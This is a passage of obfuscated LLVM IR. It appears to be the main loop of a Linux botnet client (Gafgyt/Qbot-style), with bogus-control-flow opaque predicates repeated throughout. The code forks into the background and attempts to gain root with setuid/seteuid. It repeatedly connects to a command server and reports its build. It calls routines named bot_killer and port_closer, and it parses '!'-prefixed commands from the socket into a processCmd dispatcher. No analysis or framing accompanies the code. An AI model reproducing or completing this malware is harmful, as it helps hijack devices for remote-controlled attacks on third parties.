  %53 = icmp ne i32 %52, 0
  br i1 %53, label %129, label %54

; <label>:54:                                     ; preds = %51
  %55 = load i32, i32* @x.93
  %56 = load i32, i32* @y.94
  %57 = sub i32 %55, 1
  %58 = mul i32 %55, %57
  %59 = urem i32 %58, 2
  %60 = icmp eq i32 %59, 0
  %61 = icmp slt i32 %56, 10
  %62 = or i1 %60, %61
  br i1 %62, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %54
  %63 = call i32 @fork() #5
  store i32 %63, i32* %8, align 4
  %64 = icmp ne i32 %63, 0
  %65 = load i32, i32* @x.93
  %66 = load i32, i32* @y.94
  %67 = sub i32 %65, 1
  %68 = mul i32 %65, %67
  %69 = urem i32 %68, 2
  %70 = icmp eq i32 %69, 0
  %71 = icmp slt i32 %66, 10
  %72 = or i1 %70, %71
  br i1 %72, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %64, label %73, label %90

; <label>:73:                                     ; preds = %originalBBpart2
  %74 = load i32, i32* @x.93
  %75 = load i32, i32* @y.94
  %76 = sub i32 %74, 1
  %77 = mul i32 %74, %76
  %78 = urem i32 %77, 2
  %79 = icmp eq i32 %78, 0
  %80 = icmp slt i32 %75, 10
  %81 = or i1 %79, %80
  br i1 %81, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %73
  call void @exit(i32 0) #12
  %82 = load i32, i32* @x.93
  %83 = load i32, i32* @y.94
  %84 = sub i32 %82, 1
  %85 = mul i32 %82, %84
  %86 = urem i32 %85, 2
  %87 = icmp eq i32 %86, 0
  %88 = icmp slt i32 %83, 10
  %89 = or i1 %87, %88
  br i1 %89, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  unreachable

; <label>:90:                                     ; preds = %originalBBpart2
  %91 = load i32, i32* @x.93
  %92 = load i32, i32* @y.94
  %93 = sub i32 %91, 1
  %94 = mul i32 %91, %93
  %95 = urem i32 %94, 2
  %96 = icmp eq i32 %95, 0
  %97 = icmp slt i32 %92, 10
  %98 = or i1 %96, %97
  br i1 %98, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %90
  %99 = load i32, i32* %8, align 4
  %100 = icmp ne i32 %99, 0
  %101 = load i32, i32* @x.93
  %102 = load i32, i32* @y.94
  %103 = sub i32 %101, 1
  %104 = mul i32 %101, %103
  %105 = urem i32 %104, 2
  %106 = icmp eq i32 %105, 0
  %107 = icmp slt i32 %102, 10
  %108 = or i1 %106, %107
  br i1 %108, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br i1 %100, label %110, label %109

; <label>:109:                                    ; preds = %originalBBpart28
  br label %127

; <label>:110:                                    ; preds = %originalBBpart28
  %111 = load i32, i32* @x.93
  %112 = load i32, i32* @y.94
  %113 = sub i32 %111, 1
  %114 = mul i32 %111, %113
  %115 = urem i32 %114, 2
  %116 = icmp eq i32 %115, 0
  %117 = icmp slt i32 %112, 10
  %118 = or i1 %116, %117
  br i1 %118, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %110
  %119 = load i32, i32* @x.93
  %120 = load i32, i32* @y.94
  %121 = sub i32 %119, 1
  %122 = mul i32 %119, %121
  %123 = urem i32 %122, 2
  %124 = icmp eq i32 %123, 0
  %125 = icmp slt i32 %120, 10
  %126 = or i1 %124, %125
  br i1 %126, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br label %127

; <label>:127:                                    ; preds = %originalBBpart212, %109
  br label %128

; <label>:128:                                    ; preds = %127
  br label %595

; <label>:129:                                    ; preds = %51
  %130 = load i32, i32* @x.93
  %131 = load i32, i32* @y.94
  %132 = sub i32 %130, 1
  %133 = mul i32 %130, %132
  %134 = urem i32 %133, 2
  %135 = icmp eq i32 %134, 0
  %136 = icmp slt i32 %131, 10
  %137 = or i1 %135, %136
  br i1 %137, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %129
  %138 = call i32 @chdir(i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.323, i32 0, i32 0)) #5
  %139 = call i32 @setuid(i32 0) #5
  %140 = call i32 @seteuid(i32 0) #5
  %141 = call void (i32)* @signal(i32 13, void (i32)* inttoptr (i64 1 to void (i32)*)) #5
  %142 = load i32, i32* @x.93
  %143 = load i32, i32* @y.94
  %144 = sub i32 %142, 1
  %145 = mul i32 %142, %144
  %146 = urem i32 %145, 2
  %147 = icmp eq i32 %146, 0
  %148 = icmp slt i32 %143, 10
  %149 = or i1 %147, %148
  br i1 %149, label %originalBBpart216, label %originalBB14alteredBB

originalBBpart216:                                ; preds = %originalBB14
  br label %150

; <label>:150:                                    ; preds = %156, %originalBBpart216
  %151 = call i32 @fork() #5
  %152 = icmp eq i32 %151, 0
  br i1 %152, label %153, label %594

; <label>:153:                                    ; preds = %150
  %154 = call i32 @initConnection()
  %155 = icmp ne i32 %154, 0
  br i1 %155, label %156, label %158

; <label>:156:                                    ; preds = %153
  %157 = call i32 @sleep(i32 5)
  br label %150

; <label>:158:                                    ; preds = %153
  %159 = load i32, i32* @mainCommSock, align 4
  %160 = call i8* @getBuild()
  %161 = call i32 (i32, i8*, ...) @sockprintf(i32 %159, i8* getelementptr inbounds ([29 x i8], [29 x i8]* @.str.324, i32 0, i32 0), i8* %160)
  call void @UpdateNameSrvs()
  call void @RemoveTempDirs()
  call void @bot_killer()
  call void @port_closer()
  store i32 0, i32* %11, align 4
  store i32 0, i32* %12, align 4
  br label %162

; <label>:162:                                    ; preds = %576, %originalBBpart241, %331, %158
  %163 = load i32, i32* @mainCommSock, align 4
  %164 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i32 0, i32 0
  %165 = call i32 @recvLine(i32 %163, i8* %164, i32 4096)
  store i32 %165, i32* %11, align 4
  %166 = icmp ne i32 %165, -1
  br i1 %166, label %167, label %577

; <label>:167:                                    ; preds = %162
  store i32 0, i32* %12, align 4
  br label %168

; <label>:168:                                    ; preds = %319, %167
  %169 = load i32, i32* @x.93
  %170 = load i32, i32* @y.94
  %171 = sub i32 %169, 1
  %172 = mul i32 %169, %171
  %173 = urem i32 %172, 2
  %174 = icmp eq i32 %173, 0
  %175 = icmp slt i32 %170, 10
  %176 = or i1 %174, %175
  br i1 %176, label %originalBB18, label %originalBB18alteredBB

originalBB18:                                     ; preds = %originalBB18alteredBB, %168
  %177 = load i32, i32* %12, align 4
  %178 = sext i32 %177 to i64
  %179 = load i64, i64* @numpids, align 8
  %180 = icmp ult i64 %178, %179
  %181 = load i32, i32* @x.93
  %182 = load i32, i32* @y.94
  %183 = sub i32 %181, 1
  %184 = mul i32 %181, %183
  %185 = urem i32 %184, 2
  %186 = icmp eq i32 %185, 0
  %187 = icmp slt i32 %182, 10
  %188 = or i1 %186, %187
  br i1 %188, label %originalBBpart220, label %originalBB18alteredBB

originalBBpart220:                                ; preds = %originalBB18
  br i1 %180, label %189, label %322

; <label>:189:                                    ; preds = %originalBBpart220
  %190 = load i32*, i32** @pids, align 8
  %191 = load i32, i32* %12, align 4
  %192 = sext i32 %191 to i64
  %193 = getelementptr inbounds i32, i32* %190, i64 %192
  %194 = load i32, i32* %193, align 4
  %195 = call i32 @waitpid(i32 %194, i32* null, i32 1)
  %196 = icmp sgt i32 %195, 0
  br i1 %196, label %197, label %318

; <label>:197:                                    ; preds = %189
  %198 = load i32, i32* @x.93
  %199 = load i32, i32* @y.94
  %200 = sub i32 %198, 1
  %201 = mul i32 %198, %200
  %202 = urem i32 %201, 2
  %203 = icmp eq i32 %202, 0
  %204 = icmp slt i32 %199, 10
  %205 = or i1 %203, %204
  br i1 %205, label %originalBB22, label %originalBB22alteredBB

originalBB22:                                     ; preds = %originalBB22alteredBB, %197
  %206 = load i32, i32* %12, align 4
  %207 = add nsw i32 %206, 1
  store i32 %207, i32* %14, align 4
  %208 = load i32, i32* @x.93
  %209 = load i32, i32* @y.94
  %210 = sub i32 %208, 1
  %211 = mul i32 %208, %210
  %212 = urem i32 %211, 2
  %213 = icmp eq i32 %212, 0
  %214 = icmp slt i32 %209, 10
  %215 = or i1 %213, %214
  br i1 %215, label %originalBBpart225, label %originalBB22alteredBB

originalBBpart225:                                ; preds = %originalBB22
  br label %216

; <label>:216:                                    ; preds = %248, %originalBBpart225
  %217 = load i32, i32* @x.93
  %218 = load i32, i32* @y.94
  %219 = sub i32 %217, 1
  %220 = mul i32 %217, %219
  %221 = urem i32 %220, 2
  %222 = icmp eq i32 %221, 0
  %223 = icmp slt i32 %218, 10
  %224 = or i1 %222, %223
  br i1 %224, label %originalBB27, label %originalBB27alteredBB

originalBB27:                                     ; preds = %originalBB27alteredBB, %216
  %225 = load i32, i32* %14, align 4
  %226 = zext i32 %225 to i64
  %227 = load i64, i64* @numpids, align 8
  %228 = icmp ult i64 %226, %227
  %229 = load i32, i32* @x.93
  %230 = load i32, i32* @y.94
  %231 = sub i32 %229, 1
  %232 = mul i32 %229, %231
  %233 = urem i32 %232, 2
  %234 = icmp eq i32 %233, 0
  %235 = icmp slt i32 %230, 10
  %236 = or i1 %234, %235
  br i1 %236, label %originalBBpart229, label %originalBB27alteredBB

originalBBpart229:                                ; preds = %originalBB27
  br i1 %228, label %237, label %251

; <label>:237:                                    ; preds = %originalBBpart229
  %238 = load i32*, i32** @pids, align 8
  %239 = load i32, i32* %14, align 4
  %240 = zext i32 %239 to i64
  %241 = getelementptr inbounds i32, i32* %238, i64 %240
  %242 = load i32, i32* %241, align 4
  %243 = load i32*, i32** @pids, align 8
  %244 = load i32, i32* %14, align 4
  %245 = sub i32 %244, 1
  %246 = zext i32 %245 to i64
  %247 = getelementptr inbounds i32, i32* %243, i64 %246
  store i32 %242, i32* %247, align 4
  br label %248

; <label>:248:                                    ; preds = %237
  %249 = load i32, i32* %14, align 4
  %250 = add i32 %249, 1
  store i32 %250, i32* %14, align 4
  br label %216

; <label>:251:                                    ; preds = %originalBBpart229
  %252 = load i32*, i32** @pids, align 8
  %253 = load i32, i32* %14, align 4
  %254 = sub i32 %253, 1
  %255 = zext i32 %254 to i64
  %256 = getelementptr inbounds i32, i32* %252, i64 %255
  store i32 0, i32* %256, align 4
  %257 = load i64, i64* @numpids, align 8
  %258 = add i64 %257, -1
  store i64 %258, i64* @numpids, align 8
  %259 = load i64, i64* @numpids, align 8
  %260 = add i64 %259, 1
  %261 = mul i64 %260, 4
  %262 = call noalias i8* @malloc(i64 %261) #5
  %263 = bitcast i8* %262 to i32*
  store i32* %263, i32** %13, align 8
  store i32 0, i32* %14, align 4
  br label %264

; <label>:264:                                    ; preds = %295, %251
  %265 = load i32, i32* @x.93
  %266 = load i32, i32* @y.94
  %267 = sub i32 %265, 1
  %268 = mul i32 %265, %267
  %269 = urem i32 %268, 2
  %270 = icmp eq i32 %269, 0
  %271 = icmp slt i32 %266, 10
  %272 = or i1 %270, %271
  br i1 %272, label %originalBB31, label %originalBB31alteredBB

originalBB31:                                     ; preds = %originalBB31alteredBB, %264
  %273 = load i32, i32* %14, align 4
  %274 = zext i32 %273 to i64
  %275 = load i64, i64* @numpids, align 8
  %276 = icmp ult i64 %274, %275
  %277 = load i32, i32* @x.93
  %278 = load i32, i32* @y.94
  %279 = sub i32 %277, 1
  %280 = mul i32 %277, %279
  %281 = urem i32 %280, 2
  %282 = icmp eq i32 %281, 0
  %283 = icmp slt i32 %278, 10
  %284 = or i1 %282, %283
  br i1 %284, label %originalBBpart233, label %originalBB31alteredBB

originalBBpart233:                                ; preds = %originalBB31
  br i1 %276, label %285, label %298

; <label>:285:                                    ; preds = %originalBBpart233
  %286 = load i32*, i32** @pids, align 8
  %287 = load i32, i32* %14, align 4
  %288 = zext i32 %287 to i64
  %289 = getelementptr inbounds i32, i32* %286, i64 %288
  %290 = load i32, i32* %289, align 4
  %291 = load i32*, i32** %13, align 8
  %292 = load i32, i32* %14, align 4
  %293 = zext i32 %292 to i64
  %294 = getelementptr inbounds i32, i32* %291, i64 %293
  store i32 %290, i32* %294, align 4
  br label %295

; <label>:295:                                    ; preds = %285
  %296 = load i32, i32* %14, align 4
  %297 = add i32 %296, 1
  store i32 %297, i32* %14, align 4
  br label %264

; <label>:298:                                    ; preds = %originalBBpart233
  %299 = load i32, i32* @x.93
  %300 = load i32, i32* @y.94
  %301 = sub i32 %299, 1
  %302 = mul i32 %299, %301
  %303 = urem i32 %302, 2
  %304 = icmp eq i32 %303, 0
  %305 = icmp slt i32 %300, 10
  %306 = or i1 %304, %305
  br i1 %306, label %originalBB35, label %originalBB35alteredBB

originalBB35:                                     ; preds = %originalBB35alteredBB, %298
  %307 = load i32*, i32** @pids, align 8
  %308 = bitcast i32* %307 to i8*
  call void @free(i8* %308) #5
  %309 = load i32*, i32** %13, align 8
  store i32* %309, i32** @pids, align 8
  %310 = load i32, i32* @x.93
  %311 = load i32, i32* @y.94
  %312 = sub i32 %310, 1
  %313 = mul i32 %310, %312
  %314 = urem i32 %313, 2
  %315 = icmp eq i32 %314, 0
  %316 = icmp slt i32 %311, 10
  %317 = or i1 %315, %316
  br i1 %317, label %originalBBpart237, label %originalBB35alteredBB

originalBBpart237:                                ; preds = %originalBB35
  br label %318

; <label>:318:                                    ; preds = %originalBBpart237, %189
  br label %319

; <label>:319:                                    ; preds = %318
  %320 = load i32, i32* %12, align 4
  %321 = add nsw i32 %320, 1
  store i32 %321, i32* %12, align 4
  br label %168

; <label>:322:                                    ; preds = %originalBBpart220
  %323 = load i32, i32* %11, align 4
  %324 = sext i32 %323 to i64
  %325 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i64 0, i64 %324
  store i8 0, i8* %325, align 1
  %326 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i32 0, i32 0
  call void @trim2(i8* %326)
  %327 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i32 0, i32 0
  %328 = call i8* @strstr(i8* %327, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.305, i32 0, i32 0)) #9
  %329 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i32 0, i32 0
  %330 = icmp eq i8* %328, %329
  br i1 %330, label %331, label %332

; <label>:331:                                    ; preds = %322
  br label %162

; <label>:332:                                    ; preds = %322
  %333 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i32 0, i32 0
  %334 = call i8* @strstr(i8* %333, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.325, i32 0, i32 0)) #9
  %335 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i32 0, i32 0
  %336 = icmp eq i8* %334, %335
  br i1 %336, label %337, label %338

; <label>:337:                                    ; preds = %332
  call void @exit(i32 0) #12
  unreachable

; <label>:338:                                    ; preds = %332
  %339 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i32 0, i32 0
  store i8* %339, i8** %15, align 8
  %340 = load i8*, i8** %15, align 8
  %341 = load i8, i8* %340, align 1
  %342 = zext i8 %341 to i32
  %343 = icmp eq i32 %342, 33
  br i1 %343, label %344, label %576

; <label>:344:                                    ; preds = %338
  %345 = load i8*, i8** %15, align 8
  %346 = getelementptr inbounds i8, i8* %345, i64 1
  store i8* %346, i8** %16, align 8
  br label %347

; <label>:347:                                    ; preds = %359, %344
  %348 = load i8*, i8** %16, align 8
  %349 = load i8, i8* %348, align 1
  %350 = zext i8 %349 to i32
  %351 = icmp ne i32 %350, 32
  br i1 %351, label %352, label %357

; <label>:352:                                    ; preds = %347
  %353 = load i8*, i8** %16, align 8
  %354 = load i8, i8* %353, align 1
  %355 = zext i8 %354 to i32
  %356 = icmp ne i32 %355, 0
  br label %357

; <label>:357:                                    ; preds = %352, %347
  %358 = phi i1 [ false, %347 ], [ %356, %352 ]
  br i1 %358, label %359, label %362

; <label>:359:                                    ; preds = %357
  %360 = load i8*, i8** %16, align 8
  %361 = getelementptr inbounds i8, i8* %360, i32 1
  store i8* %361, i8** %16, align 8
  br label %347

; <label>:362:                                    ; preds = %357
  %363 = load i8*, i8** %16, align 8
  %364 = load i8, i8* %363, align 1
  %365 = zext i8 %364 to i32
  %366 = icmp eq i32 %365, 0
  br i1 %366, label %367, label %384

; <label>:367:                                    ; preds = %362
  %368 = load i32, i32* @x.93
  %369 = load i32, i32* @y.94
  %370 = sub i32 %368, 1
  %371 = mul i32 %368, %370
  %372 = urem i32 %371, 2
  %373 = icmp eq i32 %372, 0
  %374 = icmp slt i32 %369, 10
  %375 = or i1 %373, %374
  br i1 %375, label %originalBB39, label %originalBB39alteredBB

originalBB39:                                     ; preds = %originalBB39alteredBB, %367
  %376 = load i32, i32* @x.93
  %377 = load i32, i32* @y.94
  %378 = sub i32 %376, 1
  %379 = mul i32 %376, %378
  %380 = urem i32 %379, 2
  %381 = icmp eq i32 %380, 0
  %382 = icmp slt i32 %377, 10
  %383 = or i1 %381, %382
  br i1 %383, label %originalBBpart241, label %originalBB39alteredBB

originalBBpart241:                                ; preds = %originalBB39
  br label %162

; <label>:384:                                    ; preds = %362
  %385 = load i8*, i8** %16, align 8
  store i8 0, i8* %385, align 1
  %386 = load i8*, i8** %15, align 8
  %387 = getelementptr inbounds i8, i8* %386, i64 1
  store i8* %387, i8** %16, align 8
  %388 = load i8*, i8** %15, align 8
  %389 = load i8*, i8** %16, align 8
  %390 = call i64 @strlen(i8* %389) #9
  %391 = getelementptr inbounds i8, i8* %388, i64 %390
  %392 = getelementptr inbounds i8, i8* %391, i64 2
  store i8* %392, i8** %15, align 8
  br label %393

; <label>:393:                                    ; preds = %413, %384
  %394 = load i8*, i8** %15, align 8
  %395 = load i8*, i8** %15, align 8
  %396 = call i64 @strlen(i8* %395) #9
  %397 = sub i64 %396, 1
  %398 = getelementptr inbounds i8, i8* %394, i64 %397
  %399 = load i8, i8* %398, align 1
  %400 = zext i8 %399 to i32
  %401 = icmp eq i32 %400, 10
  br i1 %401, label %411, label %402

; <label>:402:                                    ; preds = %393
  %403 = load i8*, i8** %15, align 8
  %404 = load i8*, i8** %15, align 8
  %405 = call i64 @strlen(i8* %404) #9
  %406 = sub i64 %405, 1
  %407 = getelementptr inbounds i8, i8* %403, i64 %406
  %408 = load i8, i8* %407, align 1
  %409 = zext i8 %408 to i32
  %410 = icmp eq i32 %409, 13
  br label %411

; <label>:411:                                    ; preds = %402, %393
  %412 = phi i1 [ true, %393 ], [ %410, %402 ]
  br i1 %412, label %413, label %419

; <label>:413:                                    ; preds = %411
  %414 = load i8*, i8** %15, align 8
  %415 = load i8*, i8** %15, align 8
  %416 = call i64 @strlen(i8* %415) #9
  %417 = sub i64 %416, 1
  %418 = getelementptr inbounds i8, i8* %414, i64 %417
  store i8 0, i8* %418, align 1
  br label %393

; <label>:419:                                    ; preds = %411
  %420 = load i8*, i8** %15, align 8
  store i8* %420, i8** %17, align 8
  br label %421

; <label>:421:                                    ; preds = %433, %419
  %422 = load i8*, i8** %15, align 8
  %423 = load i8, i8* %422, align 1
  %424 = zext i8 %423 to i32
  %425 = icmp ne i32 %424, 32
  br i1 %425, label %426, label %431

; <label>:426:                                    ; preds = %421
  %427 = load i8*, i8** %15, align 8
  %428 = load i8, i8* %427, align 1
  %429 = zext i8 %428 to i32
  %430 = icmp ne i32 %429, 0
  br label %431

; <label>:431:                                    ; preds = %426, %421
  %432 = phi i1 [ false, %421 ], [ %430, %426 ]
  br i1 %432, label %433, label %436

; <label>:433:                                    ; preds = %431
  %434 = load i8*, i8** %15, align 8
  %435 = getelementptr inbounds i8, i8* %434, i32 1
  store i8* %435, i8** %15, align 8
  br label %421

; <label>:436:                                    ; preds = %431
  %437 = load i8*, i8** %15, align 8
  store i8 0, i8* %437, align 1
  %438 = load i8*, i8** %15, align 8
  %439 = getelementptr inbounds i8, i8* %438, i32 1
  store i8* %439, i8** %15, align 8
  %440 = load i8*, i8** %17, align 8
  store i8* %440, i8** %18, align 8
  br label %441

; <label>:441:                                    ; preds = %originalBBpart245, %436
  %442 = load i8*, i8** %18, align 8
  %443 = load i8, i8* %442, align 1
  %444 = icmp ne i8 %443, 0
  br i1 %444, label %445, label %470

; <label>:445:                                    ; preds = %441
  %446 = load i32, i32* @x.93
  %447 = load i32, i32* @y.94
  %448 = sub i32 %446, 1
  %449 = mul i32 %446, %448
  %450 = urem i32 %449, 2
  %451 = icmp eq i32 %450, 0
  %452 = icmp slt i32 %447, 10
  %453 = or i1 %451, %452
  br i1 %453, label %originalBB43, label %originalBB43alteredBB

originalBB43:                                     ; preds = %originalBB43alteredBB, %445
  %454 = load i8*, i8** %18, align 8
  %455 = load i8, i8* %454, align 1
  %456 = zext i8 %455 to i32
  %457 = call i32 @toupper(i32 %456) #9
  %458 = trunc i32 %457 to i8
  %459 = load i8*, i8** %18, align 8
  store i8 %458, i8* %459, align 1
  %460 = load i8*, i8** %18, align 8
  %461 = getelementptr inbounds i8, i8* %460, i32 1
  store i8* %461, i8** %18, align 8
  %462 = load i32, i32* @x.93
  %463 = load i32, i32* @y.94
  %464 = sub i32 %462, 1
  %465 = mul i32 %462, %464
  %466 = urem i32 %465, 2
  %467 = icmp eq i32 %466, 0
  %468 = icmp slt i32 %463, 10
  %469 = or i1 %467, %468
  br i1 %469, label %originalBBpart245, label %originalBB43alteredBB

originalBBpart245:                                ; preds = %originalBB43
  br label %441

; <label>:470:                                    ; preds = %441
  store i32 1, i32* %20, align 4
  %471 = load i8*, i8** %15, align 8
  %472 = call i8* @strtok(i8* %471, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.326, i32 0, i32 0)) #5
  store i8* %472, i8** %21, align 8
  %473 = load i8*, i8** %17, align 8
  %474 = getelementptr inbounds [10 x i8*], [10 x i8*]* %19, i64 0, i64 0
  store i8* %473, i8** %474, align 16
  br label %475

; <label>:475:                                    ; preds = %522, %470
  %476 = load i8*, i8** %21, align 8
  %477 = icmp ne i8* %476, null
  br i1 %477, label %478, label %524

; <label>:478:                                    ; preds = %475
  %479 = load i8*, i8** %21, align 8
  %480 = load i8, i8* %479, align 1
  %481 = zext i8 %480 to i32
  %482 = icmp ne i32 %481, 10
  br i1 %482, label %483, label %522

; <label>:483:                                    ; preds = %478
  %484 = load i32, i32* @x.93
  %485 = load i32, i32* @y.94
  %486 = sub i32 %484, 1
  %487 = mul i32 %484, %486
  %488 = urem i32 %487, 2
  %489 = icmp eq i32 %488, 0
  %490 = icmp slt i32 %485, 10
  %491 = or i1 %489, %490
  br i1 %491, label %originalBB47, label %originalBB47alteredBB

originalBB47:                                     ; preds = %originalBB47alteredBB, %483
  %492 = load i8*, i8** %21, align 8
  %493 = call i64 @strlen(i8* %492) #9
  %494 = add i64 %493, 1
  %495 = call noalias i8* @malloc(i64 %494) #5
  %496 = load i32, i32* %20, align 4
  %497 = sext i32 %496 to i64
  %498 = getelementptr inbounds [10 x i8*], [10 x i8*]* %19, i64 0, i64 %497
  store i8* %495, i8** %498, align 8
  %499 = load i32, i32* %20, align 4
  %500 = sext i32 %499 to i64
  %501 = getelementptr inbounds [10 x i8*], [10 x i8*]* %19, i64 0, i64 %500
  %502 = load i8*, i8** %501, align 8
  %503 = load i8*, i8** %21, align 8
  %504 = call i64 @strlen(i8* %503) #9
  %505 = add i64 %504, 1
  call void @llvm.memset.p0i8.i64(i8* %502, i8 0, i64 %505, i32 1, i1 false)
  %506 = load i32, i32* %20, align 4
  %507 = sext i32 %506 to i64
  %508 = getelementptr inbounds [10 x i8*], [10 x i8*]* %19, i64 0, i64 %507
  %509 = load i8*, i8** %508, align 8
  %510 = load i8*, i8** %21, align 8
  %511 = call i8* @strcpy(i8* %509, i8* %510) #5
  %512 = load i32, i32* %20, align 4
  %513 = add nsw i32 %512, 1
  store i32 %513, i32* %20, align 4
  %514 = load i32, i32* @x.93
  %515 = load i32, i32* @y.94
  %516 = sub i32 %514, 1
  %517 = mul i32 %514, %516
  %518 = urem i32 %517, 2
  %519 = icmp eq i32 %518, 0
  %520 = icmp slt i32 %515, 10
  %521 = or i1 %519, %520
  br i1 %521, label %originalBBpart263, label %originalBB47alteredBB

originalBBpart263:                                ; preds = %originalBB47
  br label %522

; <label>:522:                                    ; preds = %originalBBpart263, %478
  %523 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.326, i32 0, i32 0)) #5
  store i8* %523, i8** %21, align 8
  br label %475

; <label>:524:                                    ; preds = %475
  %525 = load i32, i32* %20, align 4
  %526 = getelementptr inbounds [10 x i8*], [10 x i8*]* %19, i32 0, i32 0
  call void @processCmd(i32 %525, i8** %526)
  %527 = load i32, i32* %20, align 4
  %528 = icmp sgt i32 %527, 1
  br i1 %528, label %529, label %575

; <label>:529:                                    ; preds = %524
  store i32 1, i32* %22, align 4
  store i32 1, i32* %22, align 4
  br label %530

; <label>:530:                                    ; preds = %555, %529
  %531 = load i32, i32* %22, align 4
  %532 = load i32, i32* %20, align 4
  %533 = icmp slt i32 %531, %532
  br i1 %533, label %534, label %558

; <label>:534:                                    ; preds = %530
  %535 = load i32, i32* @x.93
  %536 = load i32, i32* @y.94
  %537 = sub i32 %535, 1
  %538 = mul i32 %535, %537
  %539 = urem i32 %538, 2
  %540 = icmp eq i32 %539, 0
  %541 = icmp slt i32 %536, 10
  %542 = or i1 %540, %541
  br i1 %542, label %originalBB65, label %originalBB65alteredBB

originalBB65:                                     ; preds = %originalBB65alteredBB, %534
  %543 = load i32, i32* %22, align 4
  %544 = sext i32 %543 to i64
  %545 = getelementptr inbounds [10 x i8*], [10 x i8*]* %19, i64 0, i64 %544
  %546 = load i8*, i8** %545, align 8
  call void @free(i8* %546) #5
  %547 = load i32, i32* @x.93
  %548 = load i32, i32* @y.94
  %549 = sub i32 %547, 1
  %550 = mul i32 %547, %549
  %551 = urem i32 %550, 2
  %552 = icmp eq i32 %551, 0
  %553 = icmp slt i32 %548, 10
  %554 = or i1 %552, %553
  br i1 %554, label %originalBBpart267, label %originalBB65alteredBB

originalBBpart267:                                ; preds = %originalBB65
  br label %555

; <label>:555:                                    ; preds = %originalBBpart267
  %556 = load i32, i32* %22, align 4
  %557 = add nsw i32 %556, 1
  store i32 %557, i32* %22, align 4
  br label %530

; <label>:558:                                    ; preds = %530
  %559 = load i32, i32* @x.93
  %560 = load i32, i32* @y.94
  %561 = sub i32 %559, 1
  %562 = mul i32 %559, %561
  %563 = urem i32 %562, 2
  %564 = icmp eq i32 %563, 0
  %565 = icmp slt i32 %560, 10
  %566 = or i1 %564, %565
  br i1 %566, label %originalBB69, label %originalBB69alteredBB

originalBB69:                                     ; preds = %originalBB69alteredBB, %558
  %567 = load i32, i32* @x.93
  %568 = load i32, i32* @y.94
  %569 = sub i32 %567, 1
  %570 = mul i32 %567, %569
  %571 = urem i32 %570, 2
  %572 = icmp eq i32 %571, 0
  %573 = icmp slt i32 %568, 10
  %574 = or i1 %572, %573
  br i1 %574, label %originalBBpart271, label %originalBB69alteredBB

originalBBpart271:                                ; preds = %originalBB69
  br label %575

; <label>:575:                                    ; preds = %originalBBpart271, %524
  br label %576

; <label>:576:                                    ; preds = %575, %338
  br label %162

; <label>:577:                                    ; preds = %162
  %578 = load i32, i32* @x.93
  %579 = load i32, i32* @y.94
  %580 = sub i32 %578, 1
  %581 = mul i32 %578, %580
  %582 = urem i32 %581, 2
  %583 = icmp eq i32 %582, 0
  %584 = icmp slt i32 %579, 10
  %585 = or i1 %583, %584
  br i1 %585, label %originalBB73, label %originalBB73alteredBB

originalBB73:                                     ; preds = %originalBB73alteredBB, %577
  %586 = load i32, i32* @x.93
  %587 = load i32, i32* @y.94
  %588 = sub i32 %586, 1
  %589 = mul i32 %586, %588
  %590 = urem i32 %589, 2
  %591 = icmp eq i32 %590, 0
  %592 = icmp slt i32 %587, 10
  %593 = or i1 %591, %592
  br i1 %593, label %originalBBpart275, label %originalBB73alteredBB

originalBBpart275:                                ; preds = %originalBB73
  br label %594

; <label>:594:                                    ; preds = %originalBBpart275, %150
  store i32 0, i32* %3, align 4
  br label %612

; <label>:595:                                    ; preds = %128
  %596 = load i32, i32* @x.93
  %597 = load i32, i32* @y.94
  %598 = sub i32 %596, 1
  %599 = mul i32 %596, %598
  %600 = urem i32 %599, 2
  %601 = icmp eq i32 %600, 0
  %602 = icmp slt i32 %597, 10
  %603 = or i1 %601, %602
  br i1 %603, label %originalBB77, label %originalBB77alteredBB

originalBB77:                                     ; preds = %originalBB77alteredBB, %595
  %604 = load i32, i32* @x.93
  %605 = load i32, i32* @y.94
  %606 = sub i32 %604, 1
  %607 = mul i32 %604, %606
  %608 = urem i32 %607, 2
  %609 = icmp eq i32 %608, 0
  %610 = icmp slt i32 %605, 10
  %611 = or i1 %609, %610
  br i1 %611, label %originalBBpart279, label %originalBB77alteredBB

originalBBpart279:                                ; preds = %originalBB77
  br label %612

; <label>:612:                                    ; preds = %originalBBpart279, %594
  %613 = load i32, i32* @x.93
  %614 = load i32, i32* @y.94
  %615 = sub i32 %613, 1
  %616 = mul i32 %613, %615
  %617 = urem i32 %616, 2
  %618 = icmp eq i32 %617, 0
  %619 = icmp slt i32 %614, 10
  %620 = or i1 %618, %619
  br i1 %620, label %originalBB81, label %originalBB81alteredBB

originalBB81:                                     ; preds = %originalBB81alteredBB, %612
  %621 = load i32, i32* %3, align 4
  %622 = load i32, i32* @x.93
  %623 = load i32, i32* @y.94
  %624 = sub i32 %622, 1
  %625 = mul i32 %622, %624
  %626 = urem i32 %625, 2
  %627 = icmp eq i32 %626, 0
  %628 = icmp slt i32 %623, 10
  %629 = or i1 %627, %628
  br i1 %629, label %originalBBpart283, label %originalBB81alteredBB

